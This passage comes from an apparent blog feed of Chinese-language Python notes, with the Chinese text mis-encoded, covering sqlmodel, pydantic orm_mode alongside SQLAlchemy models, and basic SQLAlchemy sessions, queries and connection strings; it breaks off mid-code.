        <content type="html"><![CDATA[<p><code>sqlmodel</code> æ˜¯å°† <code>sqlalchemy</code> å’Œ <code>pydantic</code> ç»“åˆèµ·æ¥çš„äº§ç‰©ï¼Œåœ¨å¾ˆå¤šé…ç½®ä¸Šä¸ <code>sqlalchemy</code> ä¸€è‡´ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨ä¸Šæ›´åŠ ç®€å•ã€‚å¹¶ä¸”åšäº†éå¸¸å¥½çš„autocompleteæ”¯æŒã€‚</p><p><a href="https://github.com/tiangolo/sqlmodel">Github</a><br><a href="https://sqlmodel.tiangolo.com/">æ–‡æ¡£</a></p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">pip install pymodel</span></code></pre></div></div><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><h3 id="engine-å’Œ-session-çš„åŒºåˆ«"><a href="#engine-å’Œ-session-çš„åŒºåˆ«" class="headerlink" title="engine å’Œ session çš„åŒºåˆ«"></a>engine å’Œ session çš„åŒºåˆ«</h3><p>engineæ˜¯å…¨å±€å•ä¸€çš„ï¼Œsession æ˜¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ã€‚</p><blockquote><p>We would re-use the same engine in all the code, everywhere in the application (shared by all the requests). But for each request, we would create and use a new session. And once the request is done, we would close the session.</p></blockquote><h2 id="å¤šå¯¹ä¸€-ä¸€å¯¹å¤š"><a href="#å¤šå¯¹ä¸€-ä¸€å¯¹å¤š" class="headerlink" title="å¤šå¯¹ä¸€ ä¸€å¯¹å¤š"></a>å¤šå¯¹ä¸€ ä¸€å¯¹å¤š</h2><h3 id="Relationship-ä¸­çš„-back-populates"><a href="#Relationship-ä¸­çš„-back-populates" class="headerlink" title="Relationship ä¸­çš„ back_populates"></a>Relationship ä¸­çš„ <code>back_populates</code></h3><p>æ„ä¹‰æ˜¯åœ¨commitä¹‹å‰ï¼Œå¯ä»¥è¿›è¡ŒåŒæ­¥ä¿®æ”¹å†…å®¹</p><blockquote><p><a href="https://sqlmodel.tiangolo.com/tutorial/relationship-attributes/back-populates/">è§£é‡Š</a></p></blockquote><p>è®°å¿†æŠ€å·§ï¼š</p><p><code>back_populates</code>å‚æ•°æ€»æ˜¯ä¸è‡ªèº«<code>Model</code>ç›¸å…³</p><blockquote><p>A mental trick you can use to remember is that the string in back_populates is always about the current model class you are editing. ğŸ¤“</p></blockquote><h2 id="å¤šå¯¹å¤š"><a href="#å¤šå¯¹å¤š" class="headerlink" title="å¤šå¯¹å¤š"></a>å¤šå¯¹å¤š</h2><h3 id="ä¸­é—´è¡¨åªæœ‰ä¸¤ä¸ªå­—æ®µ"><a href="#ä¸­é—´è¡¨åªæœ‰ä¸¤ä¸ªå­—æ®µ" class="headerlink" title="ä¸­é—´è¡¨åªæœ‰ä¸¤ä¸ªå­—æ®µ"></a>ä¸­é—´è¡¨åªæœ‰ä¸¤ä¸ªå­—æ®µ</h3><p>å¤šå¯¹å¤šçš„è¦ç‚¹æ˜¯å»ºç«‹ä¸€ä¸ªä¸­é—´è¡¨ï¼Œç„¶ååœ¨ä¸­é—´è¡¨ä¸­å»ºç«‹ä¸¤ä¸ªå¤–é”®ã€‚ï¼ˆä¸éœ€è¦å•ç‹¬ä¸€åˆ—ä½œä¸º primary_keyï¼‰</p><blockquote><p>A primary key is a way to uniquely identify a particular row in a single table. But it doesnâ€™t have to be a single column.<br>A primary key can be a group of the columns in a table, which combined are unique in this table.</p></blockquote><h3 id="ä¸­é—´è¡¨æœ‰é¢å¤–çš„å­—æ®µ"><a href="#ä¸­é—´è¡¨æœ‰é¢å¤–çš„å­—æ®µ" class="headerlink" title="ä¸­é—´è¡¨æœ‰é¢å¤–çš„å­—æ®µ"></a>ä¸­é—´è¡¨æœ‰é¢å¤–çš„å­—æ®µ</h3><h2 id="æ–‡ä»¶ç»“æ„"><a href="#æ–‡ä»¶ç»“æ„" class="headerlink" title="æ–‡ä»¶ç»“æ„"></a>æ–‡ä»¶ç»“æ„</h2><p>ä¸ºäº†é˜²æ­¢å¾ªç¯å¼•å…¥ï¼Œå»ºè®®çš„æ–‡ä»¶ç»“æ„</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">â”œâ”€â”€ project</span><span class="line">    â”œâ”€â”€ __init__.py</span><span class="line">    â”œâ”€â”€ app.py</span><span class="line">    â”œâ”€â”€ database.py</span><span class="line">    â””â”€â”€ models.py</span></code></pre></div></div><p><code>models.py</code>å­˜æ”¾æ‰€æœ‰çš„SQLæ¨¡å‹ï¼Œ<code>database.py</code>å­˜æ”¾æ‰€æœ‰çš„engine</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlalchemy ä¸ pydantic orm_mode</title>
      <link href="/2022/10/21/sqlalchemy-%E4%B8%8E-pydantic-orm-mode/"/>
      <url>/2022/10/21/sqlalchemy-%E4%B8%8E-pydantic-orm-mode/</url>
      
        <content type="html"><![CDATA[<p><code>pydantic</code>çš„<code>orm_mode</code>å¯ä»¥ä¸<code>sqlalchemy</code> ORMè”åŠ¨</p><h2 id="å•ä¸€è¡¨çš„æƒ…å†µ"><a href="#å•ä¸€è¡¨çš„æƒ…å†µ" class="headerlink" title="å•ä¸€è¡¨çš„æƒ…å†µ"></a>å•ä¸€è¡¨çš„æƒ…å†µ</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, String, Integer</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, constr</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ParentORM</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;parent&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">30</span>))</span><span class="line">    age = Column(Integer)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Parent</span>(<span class="hljs-params">BaseModel</span>):</span></span><span class="line">    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span></span><span class="line">    name: constr(max_length=<span class="hljs-number">30</span>)</span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line"></br></span><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>:</span></span><span class="line">        orm_mode = <span class="hljs-literal">True</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    p_orm = ParentORM(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;John&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line">    p = Parent.from_orm(p_orm)</span><span class="line">    <span class="hljs-built_in">print</span>(p.name)</span></code></pre></div></div><h2 id="å¤šä¸ªè¡¨å…³è”"><a href="#å¤šä¸ªè¡¨å…³è”" class="headerlink" title="å¤šä¸ªè¡¨å…³è”"></a>å¤šä¸ªè¡¨å…³è”</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span></span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, String, Integer, ForeignKey</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> relationship</span><span class="line"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, constr</span><span class="line"></br></span><span class="line">Base = declarative_base()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ParentORM</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;parent&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">30</span>))</span><span class="line">    age = Column(Integer)</span><span class="line"></br></span><span class="line">    children = relationship(</span><span class="line">        <span class="hljs-string">&quot;ChildORM&quot;</span>, foreign_keys=<span class="hljs-string">&#x27;ChildORM.parent_id&#x27;</span>, back_populates=<span class="hljs-string">&#x27;parent&#x27;</span></span><span class="line">    )</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChildORM</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;child&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">30</span>))</span><span class="line">    age = Column(Integer)</span><span class="line">    interests = Column(String(<span class="hljs-number">30</span>))</span><span class="line"></br></span><span class="line">    parent_id = Column(Integer, ForeignKey(<span class="hljs-string">&#x27;parent.id&#x27;</span>))</span><span class="line"></br></span><span class="line">    parent = relationship(</span><span class="line">        <span class="hljs-string">&#x27;ParentORM&#x27;</span>, foreign_keys=<span class="hljs-string">&#x27;ChildORM.parent_id&#x27;</span>, back_populates=<span class="hljs-string">&#x27;children&#x27;</span></span><span class="line">    )</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># æ³¨æ„è¿™ä¸ªç±»çš„å®šä¹‰é¡ºåº, å› ä¸ºåé¢è¦ç”¨åˆ°è¿™ä¸ªç±»ï¼Œæ‰€ä»¥éœ€è¦æ”¾åœ¨å‰é¢</span></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Children</span>(<span class="hljs-params">BaseModel</span>):</span></span><span class="line">    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span></span><span class="line">    name: constr(max_length=<span class="hljs-number">30</span>)</span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line">    interests: constr(max_length=<span class="hljs-number">30</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>:</span></span><span class="line">        orm_mode = <span class="hljs-literal">True</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Parent</span>(<span class="hljs-params">BaseModel</span>):</span></span><span class="line">    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span></span><span class="line">    name: constr(max_length=<span class="hljs-number">30</span>)</span><span class="line">    age: <span class="hljs-built_in">int</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># è¿™é‡Œå®šä¹‰çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œpydantic ä¼šè‡ªåŠ¨æŠŠå…³è”çš„ç±»æ”¾åœ¨è¿™é‡Œ</span></span><span class="line">    children: <span class="hljs-type">List</span>[Children] = []</span><span class="line"></br></span><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>:</span></span><span class="line">        orm_mode = <span class="hljs-literal">True</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    p_orm = ParentORM(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;John&#x27;</span>, age=<span class="hljs-number">30</span>)</span><span class="line">    c_orm = ChildORM(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>, name=<span class="hljs-string">&#x27;kk&#x27;</span>, age=<span class="hljs-number">10</span>, interests=<span class="hljs-string">&#x27;football&#x27;</span>)</span><span class="line">    c_orm_2 = ChildORM(<span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>, name=<span class="hljs-string">&#x27;link&#x27;</span>, age=<span class="hljs-number">4</span>, interests=<span class="hljs-string">&#x27;basketball&#x27;</span>)</span><span class="line"></br></span><span class="line">    c_orm.parent = p_orm</span><span class="line">    c_orm_2.parent = p_orm</span><span class="line"></br></span><span class="line">    p = Parent.from_orm(p_orm)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p.children))</span><span class="line">    <span class="hljs-built_in">print</span>(p.children[<span class="hljs-number">0</span>].name)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
            <tag> python </tag>
            
            <tag> sqlalchemy </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlalchemy ä½¿ç”¨æ–¹æ³•</title>
      <link href="/2022/10/20/sqlalchemy-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/10/20/sqlalchemy-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><code>SQLAlchemy</code> æ˜¯ python çš„ä¸€ä¸ªæ•°æ®åº“ ORM å·¥å…·ï¼Œæä¾›äº†å¼ºå¤§çš„å¯¹è±¡æ¨¡å‹é—´çš„è½¬æ¢ï¼Œå¯ä»¥æ»¡è¶³ç»å¤§å¤šæ•°æ•°æ®åº“æ“ä½œçš„éœ€æ±‚ï¼Œå¹¶ä¸”æ”¯æŒå¤šç§æ•°æ®åº“å¼•æ“ (sqliteï¼Œmysqlï¼Œpostgres, mongodb ç­‰)</p><p><code>SQLAlchemy</code>è¿æ¥æ•°æ®åº“çš„å­—ç¬¦ä¸²ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-elixir codeBlockLines"><span class="line"><span class="hljs-symbol">mysql:</span>/<span class="hljs-regexp">/username:password@hostname/database</span> </span><span class="line"><span class="hljs-symbol">postgresql:</span>/<span class="hljs-regexp">/username:password@hostname/database</span> </span><span class="line"><span class="hljs-symbol">sqlite:</span>/<span class="hljs-regexp">//</span><span class="hljs-regexp">/absolute/path</span><span class="hljs-regexp">/to/database</span> </span><span class="line"><span class="hljs-symbol">sqlite:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/absolute/path/to/database</span></span><span class="line"><span class="hljs-symbol">sqlite:</span>/<span class="hljs-regexp">//</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:</span></span></code></pre></div></div><h2 id="ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼connectè¿æ¥æ•°æ®åº“ä½¿ç”¨"><a href="#ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼connectè¿æ¥æ•°æ®åº“ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼connectè¿æ¥æ•°æ®åº“ä½¿ç”¨"></a>ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼connectè¿æ¥æ•°æ®åº“ä½¿ç”¨</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"></br></span><span class="line">DB_CONNECT_STRING = <span class="hljs-string">&#x27;sqlite:///:memory:&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºæ•°æ®åº“å¼•æ“,echoä¸ºTrue,ä¼šæ‰“å°æ‰€æœ‰çš„sqlè¯­å¥</span></span><span class="line">engine = create_engine(DB_CONNECT_STRING, echo=<span class="hljs-literal">True</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªconnectionï¼Œè¿™é‡Œçš„ä½¿ç”¨æ–¹å¼ä¸pythonè‡ªå¸¦çš„sqliteçš„ä½¿ç”¨æ–¹å¼ç±»ä¼¼</span></span><span class="line"><span class="hljs-comment"># ä½¿ç”¨ memory å¯ä»¥ä¸ç”¨ commitï¼Œ ä½¿ç”¨æ–‡ä»¶å°±éœ€è¦commit</span></span><span class="line"><span class="hljs-keyword">with</span> engine.connect() <span class="hljs-keyword">as</span> con:</span><span class="line">    trans = con.begin()</span><span class="line">    <span class="hljs-keyword">try</span>:</span><span class="line">        con.execute(</span><span class="line">            <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS test(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, age INTEGER)&quot;</span></span><span class="line">        )</span><span class="line">        con.execute(<span class="hljs-string">&quot;INSERT INTO test (name, age) VALUES (?, ?)&quot;</span>, (<span class="hljs-string">&#x27;elin&#x27;</span>, <span class="hljs-number">30</span>))</span><span class="line">        trans.commit()</span><span class="line">    <span class="hljs-keyword">except</span>:</span><span class="line">        trans.rollback()</span><span class="line">        <span class="hljs-keyword">raise</span></span></code></pre></div></div><h2 id="ä½¿ç”¨-session-æ–¹å¼"><a href="#ä½¿ç”¨-session-æ–¹å¼" class="headerlink" title="ä½¿ç”¨ session æ–¹å¼"></a>ä½¿ç”¨ session æ–¹å¼</h2><p>connection æ˜¯ä¸€èˆ¬ä½¿ç”¨æ•°æ®åº“çš„æ–¹å¼ï¼Œsqlalchemy è¿˜æä¾›äº†å¦ä¸€ç§æ“ä½œæ•°æ®åº“çš„æ–¹å¼ï¼Œé€šè¿‡ session å¯¹è±¡ï¼Œsession å¯ä»¥è®°å½•å’Œè·Ÿè¸ªæ•°æ®çš„æ”¹å˜ï¼Œåœ¨é€‚å½“çš„æ—¶å€™æäº¤ï¼Œå¹¶ä¸”æ”¯æŒå¼ºå¤§çš„ ORM çš„åŠŸèƒ½ï¼Œä¸‹é¢æ˜¯åŸºæœ¬ä½¿ç”¨ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine </span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker </span><span class="line"></br></span><span class="line"><span class="hljs-comment"># æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸² </span></span><span class="line">root_path = os.path.dirname(__file__).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="line">DB_CONNECT_STRING = <span class="hljs-string">f&#x27;sqlite:///<span class="hljs-subst">&#123;root_path&#125;</span>/sqlit.db&#x27;</span> </span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºæ•°æ®åº“å¼•æ“,echoä¸ºTrue,ä¼šæ‰“å°æ‰€æœ‰çš„sqlè¯­å¥ </span></span><span class="line">engine = create_engine(DB_CONNECT_STRING, echo=<span class="hljs-literal">True</span>) </span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºä¼šè¯ç±» </span></span><span class="line">DB_Session = sessionmaker(bind=engine) </span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºä¼šè¯å¯¹è±¡ </span></span><span class="line">session = DB_Session() </span><span class="line"></br></span><span class="line"><span class="hljs-comment"># dosomething with session </span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># ç”¨å®Œè®°å¾—å…³é—­ï¼Œä¹Ÿå¯ä»¥ç”¨with </span></span><span class="line">session.close()</span></code></pre></div></div><p>ä¸Šé¢åˆ›å»ºäº†sessionå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ“ä½œæ•°æ®åº“</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">session</span>.<span class="hljs-keyword">execute</span>(<span class="hljs-string">&#x27;select * from User&#x27;</span>) </span><span class="line"><span class="hljs-keyword">session</span>.<span class="hljs-keyword">execute</span>(&quot;insert into User(name, age) values(&#x27;bomo&#x27;, 13)&quot;) </span><span class="line"><span class="hljs-keyword">session</span>.<span class="hljs-keyword">execute</span>(&quot;insert into User(name, age) values(:name, :age)&quot;, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;bomo&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>:<span class="hljs-number">12</span>&#125;) </span><span class="line"></br></span><span class="line"># å¦‚æœæ˜¯å¢åˆ æ”¹ï¼Œéœ€è¦<span class="hljs-keyword">commit</span> </span><span class="line"><span class="hljs-keyword">session</span>.<span class="hljs-keyword">commit</span>()</span></code></pre></div></div><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p>ORM æ¡†æ¶å°±æ˜¯å°†å¯¹è±¡å’Œæ•°æ®åº“æ˜ å°„èµ·æ¥ï¼Œå®ç°äº†è§£è€¦ã€‚</p><h4 id="æ— å…³è”æ•°æ®è¡¨"><a href="#æ— å…³è”æ•°æ®è¡¨" class="headerlink" title="æ— å…³è”æ•°æ®è¡¨"></a>æ— å…³è”æ•°æ®è¡¨</h4><div class="codeBlockContainer"><div class="codeBlockTitle">models/__init__.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># å£°æ˜ä¸€ä¸ªBaseåŸºç±»</span></span><span class="line">Base = declarative_base()</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">models/user.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String</span><span class="line"><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> Base</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;User&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">50</span>))</span><span class="line">    age = Column(Integer)</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">models/role.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, Integer, String</span><span class="line"><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> Base</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Role</span>(<span class="hljs-params">Base</span>):</span></span><span class="line">    __tablename__ = <span class="hljs-string">&#x27;Role&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)</span><span class="line">    name = Column(String(<span class="hljs-number">50</span>))</span></code></pre></div></div><p>Column å¯ä»¥å®šä¹‰çš„ç›¸å…³å‚æ•°ï¼š</p><ul><li>nameï¼šåç§° (å¯ä»¥ä¸å†™)</li><li>typeï¼šåˆ—ç±»å‹</li><li>autoincrementï¼šè‡ªå¢</li><li>defaultï¼šé»˜è®¤å€¼</li><li>indexï¼šç´¢å¼•</li><li>nullableï¼šå¯ç©º</li><li>primary_keyï¼šå¤–é”®</li></ul><div class="codeBlockContainer"><div class="codeBlockTitle">learn_sqlalchemy.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker</span><span class="line"><span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> Base</span><span class="line"><span class="hljs-keyword">from</span> models.user <span class="hljs-keyword">import</span> User</span><span class="line"><span class="hljs-keyword">from</span> models.role <span class="hljs-keyword">import</span> Role</span><span class="line"></br></span><span class="line"></br></span><span class="line">root_path = os.path.dirname(__file__).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="line">DB_CONNECT_STRING = <span class="hljs-string">f&#x27;sqlite:///<span class="hljs-subst">&#123;root_path&#125;</span>/sqlalchemy.db&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºæ•°æ®åº“å¼•æ“, echo = True ä¼šæ‰“å°å‡ºæ‰€æœ‰çš„SQLè¯­å¥</span></span><span class="line">engine = create_engine(DB_CONNECT_STRING, echo=<span class="hljs-literal">False</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºä¼šè¯ç±»</span></span><span class="line">DB_Session = sessionmaker(bind=engine)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºä¼šè¯å¯¹è±¡</span></span><span class="line">session = DB_Session()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 1. åˆ›å»ºè¡¨(å¦‚æœè¡¨å·²ç»å­˜åœ¨ï¼Œä¸ä¼šé‡å¤åˆ›å»º)</span></span><span class="line">Base.metadata.create_all(engine)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 2. æ’å…¥æ•°æ®</span></span><span class="line">u = User(name=<span class="hljs-string">&#x27;user1&#x27;</span>, age=<span class="hljs-number">10</span>)</span><span class="line">r = Role(name=<span class="hljs-string">&#x27;user&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 2.1 ä½¿ç”¨ add æ·»åŠ åˆ° sessionï¼Œ å¦‚æœå·²ç»å­˜åœ¨ï¼Œä¸ä¼šé‡å¤æ·»åŠ </span></span><span class="line">session.add(u)</span><span class="line">session.add(r)</span><span class="line">session.commit()</span><span class="line"><span class="hljs-built_in">print</span>(u.<span class="hljs-built_in">id</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 3. ä¿®æ”¹æ•°æ®</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 3.1 ä½¿ç”¨mergeæ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¿®æ”¹ï¼Œä¸å­˜åœ¨åˆ™æ·»åŠ </span></span><span class="line">r.name = <span class="hljs-string">&#x27;admin&#x27;</span></span><span class="line">session.merge(r)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 3.2 ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹å¼ä¿®æ”¹</span></span><span class="line">session.query(Role).<span class="hljs-built_in">filter</span>(Role.<span class="hljs-built_in">id</span> == <span class="hljs-number">1</span>).update(&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 4. åˆ é™¤æ•°æ®</span></span><span class="line">session.query(Role).<span class="hljs-built_in">filter</span>(Role.<span class="hljs-built_in">id</span> == <span class="hljs-number">1</span>).delete()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5. æŸ¥è¯¢æ•°æ®</span></span><span class="line"><span class="hljs-comment"># 5.1 è¿”å›ç»“æœé›†çš„ç¬¬äºŒé¡¹</span></span><span class="line">user = session.query(Role).get(<span class="hljs-number">2</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.2 è¿”å›ç»“æœé›†çš„ç¬¬2-3é¡¹</span></span><span class="line">users = session.query(Role)[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.3 æ¡ä»¶æŸ¥è¯¢</span></span><span class="line">user = session.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> &lt; <span class="hljs-number">6</span>).first()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.4 æ’åº</span></span><span class="line">users = session.query(User).order_by(User.name)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 5.5 